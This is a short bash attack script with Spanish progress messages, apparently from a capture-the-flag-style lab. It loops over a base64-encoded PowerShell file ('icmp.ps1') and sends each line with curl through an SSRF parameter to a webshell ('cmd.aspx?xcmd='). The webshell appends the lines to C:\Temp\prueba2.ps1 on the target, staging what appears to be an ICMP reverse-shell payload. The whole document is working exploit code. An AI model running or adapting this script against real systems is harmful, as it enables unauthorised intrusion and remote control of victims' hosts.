#!/bin/bash

counter=0
for line in $(cat icmp.ps1.b64); do
	echo -ne "[+] Total de lineas enviadas [$counter/87]\r"
	
  curl -s "http://10.10.10.57:62696/test.asp?u=http://127.0.0.1/cmd.aspx?xcmd=echo%20$line%20>>%20C:\Temp\prueba2.ps1"

	let counter+=1
done
